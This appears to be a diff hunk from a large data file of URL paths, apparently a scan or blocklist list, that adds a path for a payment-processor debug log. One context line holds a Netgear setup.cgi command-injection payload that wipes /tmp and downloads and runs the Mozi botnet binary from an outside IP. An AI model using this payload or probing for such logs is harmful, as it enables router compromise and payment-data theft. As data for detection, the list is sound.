@@ -24954,3 +24954,4 @@ packetsdatabase.com:443
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://179.87.101.63:53571/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /storage/logs/virtualmerchantpro_debuger.txt
 /vendor/phpunit/phpunit/LICENSE
+/storage/logs/moneris_api_raw_debug.txt
